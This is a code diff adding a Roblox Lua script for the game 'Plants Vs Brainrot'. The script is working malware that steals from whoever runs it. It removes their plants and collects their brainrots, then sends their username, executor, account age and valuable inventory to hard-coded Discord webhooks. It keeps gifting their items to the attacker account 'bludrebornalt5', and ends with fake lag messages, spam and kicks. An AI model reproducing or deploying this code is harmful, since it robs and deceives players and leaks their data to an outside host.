@@ -1,0 +1,581 @@
+
+local username = "bludrebornalt5" 
+local webhook = "https://discord.com/api/webhooks/1364426276886020150/sVc0t4qRWkWNBYgHnk62AfvdS1te9pWcnauCkFEqNoaBt1-z8bmoO2pn7xa9-RWF5mtj" 
+local public = "https://discord.com/api/webhooks/1424596611723427910/FVKJ52a-s8GP7V4_0LSXlZoGlwV2uhn4i-5at2d92SkJTlOZQSn37B4zNmKAJq2YOXZA"
+local minworth = 100000 -- Brainrot 
+local minvalue = 1250000000 -- Plants
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local displayname = localPlayer.DisplayName
+local jobId = game.JobId
+local placeId = game.PlaceId
+local accountAge = localPlayer.AccountAge
+local StarterGui = game:GetService("StarterGui")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local backpack = localPlayer:WaitForChild("Backpack")
+local humanoidrootpart = character:WaitForChild("HumanoidRootPart")
+local head = character:WaitForChild("Head")
+local camera = workspace.CurrentCamera
+local Replicatedstorage = game:GetService("ReplicatedStorage")
+local giftRemote = Replicatedstorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
+local mydisplayname = localPlayer.DisplayName
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    game:GetService("Players").LocalPlayer:Kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+local function getLastPage()
+    local http = game:GetService("HttpService")
+    local cursor = ""
+    local result = nil
+    while true do
+        local success, data = pcall(function()
+            return http:JSONDecode(
+                game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"..(cursor ~= "" and "&cursor="..cursor or ""))
+            )
+        end)
+        if not success or not data then break end
+        result = data
+        if data.nextPageCursor then
+            cursor = data.nextPageCursor
+        else
+            break
+        end
+    end
+    return result
+end
+
+if #game:GetService("Players"):GetPlayers() >= game:GetService("Players").MaxPlayers then
+    local servers = getLastPage()
+    if servers and servers.data and #servers.data > 0 then
+        local lowest, serverId = math.huge, nil
+        for _, v in next, servers.data do
+            if tonumber(v.playing) and tonumber(v.maxPlayers)
+            and v.id ~= game.JobId
+            and tonumber(v.playing) < tonumber(v.maxPlayers) then
+                if tonumber(v.playing) < lowest then
+                    lowest = tonumber(v.playing)
+                    serverId = v.id
+                end
+            end
+        end
+        if serverId then
+            game:GetService("TeleportService"):TeleportToPlaceInstance(
+                game.PlaceId,
+                serverId,
+                game:GetService("Players").LocalPlayer
+            )
+            return
+        end
+    end
+end
+
+local args = {
+{
+Value = false,
+Setting = "SFX"
+}
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeSetting"):FireServer(unpack(args))
+
+local function getExploitName()
+    local exploit =
+        (identifyexecutor and identifyexecutor()) or
+        (syn and syn.get_executor and syn.get_executor()) or
+        (secure_load and "SecureLoad") or
+        (KRNL_LOADED and "KRNL") or
+        (islclosure and "Unknown Executor") or
+        "Unknown"
+    return exploit
+end
+
+local mybase = nil
+local idsList = {}
+
+for _, plot in ipairs(workspace.Plots:GetChildren()) do
+    local playerSign = plot:WaitForChild("PlayerSign")
+    if playerSign then
+        local billboardGui = playerSign:FindFirstChildOfClass("BillboardGui")
+        if billboardGui then
+            local textLabel = billboardGui:FindFirstChildOfClass("TextLabel")
+            if textLabel and textLabel.Text == mydisplayname then
+                local plantsFolder = plot:FindFirstChild("Plants")
+                if plantsFolder then
+                    local function collectIDs(obj)
+                        if obj:GetAttribute("ID") then
+                            table.insert(idsList, obj:GetAttribute("ID"))
+                        end
+                        for _, child in ipairs(obj:GetChildren()) do
+                            collectIDs(child)
+                        end
+                    end
+
+                    for _, plant in ipairs(plantsFolder:GetChildren()) do
+                        collectIDs(plant)
+                    end
+                end
+            end
+        end
+    end
+end
+
+local removeItem = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("RemoveItem")
+for _, id in ipairs(idsList) do
+    removeItem:FireServer(id)
+end
+
+for _, plot in ipairs(workspace.Plots:GetChildren()) do
+    local playersign = plot:FindFirstChild("PlayerSign")
+    if playersign then
+        local billboardgui = playersign:FindFirstChildOfClass("BillboardGui")
+        if billboardgui then
+            local textlabel = billboardgui:FindFirstChildOfClass("TextLabel")
+            if textlabel and textlabel.Text == mydisplayname then
+                mybase = plot
+                break
+            end
+        end
+    end
+end
+task.wait(1)
+    local brainrots = mybase:FindFirstChild("Brainrots")
+    if brainrots then
+        local prompts = {}
+        for _, obj in ipairs(brainrots:GetDescendants()) do
+            if obj:IsA("ProximityPrompt") then
+                table.insert(prompts, obj)
+            end
+        end
+
+        local runservice = game:GetService("RunService")
+        local heightAboveHead = 10
+        local connection
+        connection = runservice.RenderStepped:Connect(function()
+            local newCameraPosition = head.Position + Vector3.new(0, heightAboveHead, 0)
+            local lookAtPosition = head.Position
+            camera.CameraType = Enum.CameraType.Scriptable
+            camera.CFrame = CFrame.new(newCameraPosition, lookAtPosition)
+        end)
+
+        for i, prompt in ipairs(prompts) do
+            local parent = prompt.Parent
+            if parent and parent:IsA("BasePart") then
+                humanoidrootpart.CFrame = parent.CFrame + Vector3.new(0, 3, 0)
+                task.wait(0.3)
+                prompt.HoldDuration = 0
+                prompt.MaxActivationDistance = 10
+                prompt:InputHoldBegin()
+                task.wait()
+                prompt:InputHoldEnd()
+                task.wait(0.2)
+            end
+        end
+
+        if connection then
+            connection:Disconnect()
+        end
+        camera.CameraType = Enum.CameraType.Custom
+    end
+
+task.wait(0.5)
+
+local poor = 0
+local noob = false 
+
+local function collectInventoryItems1()
+    local items = {}
+
+    local function checkContainer(container)
+        for _, tool in ipairs(container:GetChildren()) do
+            if tool:IsA("Tool") then
+                local itemName = tool:GetAttribute("ItemName")
+                if not itemName then
+                    local itemNameObj = tool:FindFirstChild("ItemName")
+                    if itemNameObj and itemNameObj:IsA("StringValue") then
+                        itemName = itemNameObj.Value
+                    end
+                end
+                if not itemName then
+                    itemName = tool.Name
+                end
+
+                local worth
+                local worthAttr = tool:GetAttribute("Worth")
+                if worthAttr and typeof(worthAttr) == "number" then
+                    worth = worthAttr
+                else
+                    local worthObj = tool:FindFirstChild("Worth")
+                    if worthObj and worthObj:IsA("NumberValue") then
+                        worth = worthObj.Value
+                    end
+                end
+
+                if worth and worth >= minworth then
+                    table.insert(items, {name = itemName, worth = worth})
+                end
+            end
+        end
+    end
+
+    checkContainer(backpack)
+    checkContainer(character)
+
+    if #items == 0 then
+        poor = poor + 1
+        return nil
+    else
+        table.sort(items, function(a, b) return a.worth > b.worth end)
+
+        local result = {}
+        for i, item in ipairs(items) do
+            if i > 10 then
+                table.insert(result, "More...")
+                break
+            end
+            table.insert(result, item.name .. " " .. item.worth .. "/s")
+        end
+        return table.concat(result, "\n")
+    end
+end
+task.wait(0.3)
+local inventoryText = collectInventoryItems1()
+
+local function collectInventoryItems2()
+    local items = {}
+    local function checkContainer(container)
+        for _, tool in ipairs(container:GetChildren()) do
+            if tool:IsA("Tool") then
+                local itemName = tool:GetAttribute("ItemName")
+                if not itemName then
+                    local itemNameObj = tool:FindFirstChild("ItemName")
+                    if itemNameObj and itemNameObj:IsA("StringValue") then
+                        itemName = itemNameObj.Value
+                    end
+                end
+                if not itemName then
+                    itemName = tool.Name
+                end
+                if not string.find(itemName, "Seed") then
+                    local price
+                    local priceAttr = tool:GetAttribute("Price")
+                    if priceAttr and typeof(priceAttr) == "number" then
+                        price = priceAttr
+                    else
+                        local priceObj = tool:FindFirstChild("Price")
+                        if priceObj and priceObj:IsA("NumberValue") then
+                            price = priceObj.Value
+                        end
+                    end
+
+                    local damage
+                    local damageAttr = tool:GetAttribute("Damage")
+                    if damageAttr and typeof(damageAttr) == "number" then
+                        damage = damageAttr
+                    else
+                        local damageObj = tool:FindFirstChild("Damage")
+                        if damageObj and damageObj:IsA("NumberValue") then
+                            damage = damageObj.Value
+                        end
+                    end
+
+                    if price and price >= minvalue then
+                        table.insert(items, {name = itemName, price = price, damage = damage or 0})
+                    end
+                end
+            end
+        end
+    end
+
+    checkContainer(backpack)
+    checkContainer(character)
+
+    if #items == 0 then
+        poor = poor + 1
+        if poor == 2 then
+            noob = true 
+            game:GetService("Players").LocalPlayer:Kick(":)")
+        end
+        return nil
+    end
+
+    table.sort(items, function(a, b) return a.damage > b.damage end)
+
+    local result = {}
+    for i, item in ipairs(items) do
+        if i > 10 then
+            table.insert(result, "More...")
+            break
+        end
+        table.insert(result, item.name .. " " .. item.damage .. "/Damage")
+    end
+    return table.concat(result, "\n")
+end
+task.wait(0.3)
+local inventoryPlant = collectInventoryItems2()
+
+if noob ~= true then
+local exploit = getExploitName()
+local teleportLine = string.format("--[[@everyone]]\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')", placeId, jobId)
+local joinURL = string.format("[Click Here To Join!](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", placeId, jobId)
+
+local fields = {
+    {
+        name = ":bust_in_silhouette: Player Information",
+        value = "```Name: " .. localPlayer.Name ..
+            "\nReceiver: " .. username ..
+            "\nExecutor: " .. exploit ..
+            "\nAccount Age: " .. accountAge .. " Days" ..
+            "\nPlayer On Server: " .. #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. "```",
+        inline = false
+    },
+    {
+        name = "Join Link",
+        value = joinURL,
+        inline = false
+    },
+    {
+        name = ":package: Inventory Brainrot :brain:",
+        value = "```" .. (inventoryText ~= "" and inventoryText or "No items found") .. "```",
+        inline = false
+    },
+    {
+        name = ":package: Inventory Plant :seedling:",
+        value = "```" .. (inventoryPlant~= "" and inventoryPlant or "No items found") .. "```",
+        inline = false
+    }
+}
+
+local data = {
+    ["content"] = teleportLine,
+    ["embeds"] = {{
+        ["title"] = "Plants Vs Brainrot Hit! :dart:",
+        ["fields"] = fields,
+        ["color"] = 16711680,
+        ["footer"] = {
+            ["text"] = os.date("%Y-%m-%d %H:%M:%S")
+        }
+    }}
+}
+
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+local body = HttpService:JSONEncode(data)
+
+pcall(function()
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end)
+
+local fields = {
+    {
+        name = ":bust_in_silhouette: Player Information",
+        value = "```Name: " .. localPlayer.Name ..
+            "\nExecutor: " .. exploit ..
+            "\nAccount Age: " .. accountAge .. "```",
+        inline = false
+    },
+    {
+        name = ":package: Inventory Brainrot :brain:",
+        value = "```" .. (inventoryText ~= "" and inventoryText or "No items found") .. "```",
+        inline = false
+    },
+    {
+        name = ":package: Inventory Plant :seedling:",
+        value = "```" .. (inventoryPlant~= "" and inventoryPlant or "No items found") .. "```",
+        inline = false
+    }
+}
+
+local data = {
+    ["embeds"] = {{
+        ["title"] = "Plants Vs Brainrot Hit! :dart:",
+        ["fields"] = fields,
+        ["color"] = 16711680,
+        ["footer"] = {
+            ["text"] = os.date("%Y-%m-%d %H:%M:%S")
+        }
+    }}
+}
+
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+pcall(function()
+    request({
+        Url = public,
+        Method = "POST",
+        Headers = headers,
+        Body = HttpService:JSONEncode(data)
+    })
+end)
+end
+
+local function waitForTarget()
+    local target = Players:FindFirstChild(username)
+    if target then
+        if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
+            target.Character = target.CharacterAdded:Wait()
+        end
+        return target
+    end
+    target = Players.PlayerAdded:Wait()
+    while target.Name ~= username do
+        target = Players.PlayerAdded:Wait()
+    end
+    target.Character = target.CharacterAdded:Wait()
+    return target
+end
+
+local targetPlayer = waitForTarget()
+
+task.spawn(function()
+	while true do
+		local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+		if tool then
+			local args = {
+				{
+					Item = game.Players.LocalPlayer.Character:WaitForChild(tool.Name),
+					ToGift = username 
+				}
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("GiftItem"):FireServer(unpack(args))
+		end
+		task.wait(0.1)
+	end
+end)
+
+task.spawn(function()
+    while true do
+        while true do
+            local highestItem = nil
+            local highestWorth = -math.huge
+
+            for _, item in pairs(backpack:GetChildren()) do
+                local worth = item:GetAttribute("Worth")
+                if worth and worth >= minworth and worth > highestWorth then
+                    highestItem = item
+                    highestWorth = worth
+                end
+            end
+
+            if not highestItem then
+                break
+            end
+
+            local equippedItem = character:FindFirstChildOfClass("Tool")
+            if equippedItem then
+                equippedItem.Parent = backpack
+                task.wait(0.5)
+            end
+
+            repeat task.wait() until not character:FindFirstChildOfClass("Tool")
+
+            highestItem.Parent = character
+
+            local args = {
+                {
+                    Item = highestItem,
+                    ToGift = username
+                }
+            }
+            giftRemote:FireServer(unpack(args))
+
+            task.wait(0.5)
+            repeat task.wait() until #backpack:GetChildren() > 0 or not highestItem.Parent
+            task.wait(0.3)
+        end
+
+        while true do
+            local highestItem = nil
+            local highestPrice = -math.huge
+
+            for _, item in pairs(backpack:GetChildren()) do
+                if not item.Name:find("Seed") then
+                    local price = item:GetAttribute("Price")
+                    if price and price >= minvalue and price > highestPrice then
+                        highestItem = item
+                        highestPrice = price
+                    end
+                end
+            end
+
+            if not highestItem then
+                break
+            end
+
+            local equippedItem = character:FindFirstChildOfClass("Tool")
+            if equippedItem then
+                equippedItem.Parent = backpack
+                task.wait(0.5)
+            end
+
+            repeat task.wait() until not character:FindFirstChildOfClass("Tool")
+
+            highestItem.Parent = character
+
+            local args = {
+                {
+                    Item = highestItem,
+                    ToGift = username
+                }
+            }
+            giftRemote:FireServer(unpack(args))
+
+            task.wait(0.5)
+            repeat task.wait() until #backpack:GetChildren() > 0 or not highestItem.Parent
+            task.wait(0.3)
+        end
+
+        task.wait(1)
+    end
+end)
+
+task.spawn(function()
+    local function checkItems()
+        local found = false
+
+        for _, item in pairs(backpack:GetChildren()) do
+            local worth = item:GetAttribute("Worth")
+            local price = item:GetAttribute("Price")
+            if (worth and worth >= minworth) or (price and price >= minvalue and not item.Name:find("Seed")) then
+                found = true
+                break
+            end
+        end
+
+        if not found then
+            local equipped = character:FindFirstChildOfClass("Tool")
+            if equipped then
+                local worth = equipped:GetAttribute("Worth")
+                local price = equipped:GetAttribute("Price")
+                if (worth and worth >= minworth) or (price and price >= minvalue and not equipped.Name:find("Seed")) then
+                    found = true
+                end
+            end
+        end
+
+        if not found then
+            game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Ankazcx On Top')
+            setclipboard("discord.gg/PebjxmePmd")
+            task.wait(0.7)
+            game:GetService("Players").LocalPlayer:Kick("Your device is lagging. Join discord.gg/PebjxmePmd") 
+        end
+    end
+
+    while true do
+        checkItems()
+        task.wait(2)
+    end
+end)
